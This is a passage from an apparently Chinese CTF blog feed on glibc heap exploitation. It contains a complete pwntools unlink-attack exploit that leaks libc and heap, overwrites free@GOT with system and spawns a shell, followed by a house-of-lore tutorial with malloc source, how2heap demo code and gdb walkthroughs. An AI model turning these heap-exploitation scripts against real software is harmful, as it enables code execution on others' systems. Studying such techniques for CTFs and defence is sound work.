src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639040867558379/37726261c41894910c0073c7e053bb4b935a2098.png" alt="image-20211209170747276"></p><p>dele(2) 触发 unlink</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639041041536111/7d9062c8f8af762ddcfef154f9e76212f99bd477.png" alt="image-20211209171041288"></p><h4 id="改地址"><a href="#改地址" class="headerlink" title="改地址"></a>改地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pay = p64(<span class="number">6</span>)</span><br><span class="line">pay +=p64(<span class="number">0x1</span>) + p64(<span class="number">0x8</span>)</span><br><span class="line">pay +=p64(free_got)</span><br><span class="line">pay += <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>  触发后指向 chunk 0 的指针会指向 <code>ptr-0x18</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;2.23/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x1150940</span>-<span class="number">0x114f000</span>)</span><br><span class="line">print(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap)) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f0dd52dab78</span>-<span class="number">0x7f0dd4f17000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">ptr = heap + <span class="number">0x30</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">pay +=p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)<span class="comment">#0x10</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">0x30</span><span class="comment">#0x20</span></span><br><span class="line">pay +=p64(<span class="number">0x50</span>) + p64(<span class="number">0x20</span>)<span class="comment">#0x10 </span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span> </span><br><span class="line">pay +=p64(<span class="number">0x110</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">pay +=p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pay = p64(<span class="number">6</span>)</span><br><span class="line">pay +=p64(<span class="number">0x1</span>) + p64(<span class="number">0x8</span>)</span><br><span class="line">pay +=p64(free_got)</span><br><span class="line">pay += <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk 0x0000000006020A8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考博客</p><p><a href="https://cloud.tencent.com/developer/article/1557872">https://cloud.tencent.com/developer/article/1557872</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of lore(包含tcache stashing unlink attack)</title>
      <link href="/2021/11/24/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-lore/"/>
      <url>/2021/11/24/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-lore/</url>
      
        <content type="html"><![CDATA[<p> house of lore 一般是 small bin 的一种利用手段，一般 libc 版本为 2.23 和 2.29 </p><h2 id="small-bin-结构"><a href="#small-bin-结构" class="headerlink" title="small bin 结构"></a>small bin 结构</h2><p>每个small bin维护着一个双向循环链表，而且chunk size都相同。当allocate memory时，总是从链表尾端unlink一个chunk，deallocate memory时，将那个chunk link到链表头。属于FILO(先进后出)规则，每个chunk都有机会被分配到app。<br><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637754665853023/645c38301c53f01bbf5be952e12e5a9278b671a3.png" alt="1"></p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>环境为 Ubuntu 16.04</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。(victim 此时为 small bin 中最后一个 chunk)</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type, 则将获取到的 chunk 初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要漏洞点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// 检查 bck-&gt;fd (倒数第二个chunk)是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>如果我们可以修改 <strong>small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk</strong>，并且同时<code>__glibc_unlikely(bck-&gt;fd != victim</code>检查通过(<strong>即将 fake chunk 的 fd改为 victim</strong>)，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk，实现任意地址写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smallbin: chunk2 -&gt; chunk1    -----&gt;    smallbin: fake_chunk -&gt; chunk1</span><br></pre></td></tr></table></figure><h3 id="how2heap-代码演示"><a href="#how2heap-代码演示" class="headerlink" title="how2heap 代码演示"></a>how2heap 代码演示</h3><p>用的是 yichen 师傅翻译好的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;定义了两个数组&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 在 %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 在 %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span>, victim);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;<span class="comment">//chunk 开始的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;在栈上伪造一块 fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span>, victim);</span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span>);</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span>,stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 在栈上 %p\n&quot;</span>, p4);</span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 <code>gcc -g 文件名.c</code>编译后将断点下在 19 行，可以看到程序已经申请了一个 chunk(victim)，size 为 0x71 </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637759462221550/d8d5bdf297b3c5680a36d13d97c44cbf51545cbd.png" alt="image-20211124211101962"></p><p>再将断点下在 29 行，观察栈中 fake_chunk 的分布情况</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637760391564774/8750292817574463fa94e77266d17cb8d989a8b3.png" alt="image-20211124212631334"></p><p>再将断点下在 39 行，free victim，它的 fd 和 bk 都变成了0</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637818006283957/b2d157377f6a256b33d44fee459074b3d57ef84d.png" alt="image-20211125132646035"></p><p>再将断点下在 42 行，此前 victim 已经进入 fastbin ，malloc 后触发 fastbin 的合并，并进入 unsortedbin，最后到 smallbin</p><hr><p>为什么是 fastbin 而不是程序中所说的 unsortedbin 这里我说一下，程序原本希望在 32 位机上测试的，但我的机子是 64 位的，100的chunk &lt; max_fast(128)所以被放进了fastbin中，但如果是32位机子的话，100&gt;max_fast(64)因此被放入了unsorted bin中 )</p><hr><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637819558198076/12e57442c5023537d6bb6a512ae2d332759d8c3c.png" alt="image-20211125135238017"></p><p>现在就需要我们分配一个既不是 unsortedbin 又不是 smallbin 的 chunk 了，一个超大的 chunk 会从 top chunk 里分一块出来，然后系统会把 unsorted bin 中的 chunk 塞入属于他的 bins 中</p><hr><p>如果是32位机子会直接从unsortedbin 中被扔进 smallbins，但是64位多了几个步骤</p><p>因为我们分配了 1200 的大内存，ptmalloc 会先从 fastbin 中找，然后依次在 unsortedbin，smallbin 中查找看看有没有符合的 chunk ，因为我们没有符合的 chunk，所以 ptmalloc 会把 fastbin 的 chunk 合并，然后放到 unsortedbin 中，再从 unsortedbin 中查找，发现还是不符合，就会把 unsortedbin 中的 chunk 放入属于他的 bins 中，此时我们的 victim 就被放进了 smallbin 中了</p><hr><p>此时的 fd 和 bk 都为 unsortedbin 的地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637819847446306/da9bebc224c7d3ec592d40c0a7ddfb156df950b5.png" alt="image-20211125135727224"></p><p>再将断点下在 49 行，将 victim 的 bk 改为 stack_buffer_1</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637820306432657/5c8572132786e5d7e147cb09bce439c00c663d47.png" alt="image-20211125140506253"></p><p>再将断点下在 53 行，将 victim 申请出来</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637821181542523/f1da4217f9ec280d43fbf5e0e59055284d316790.png" 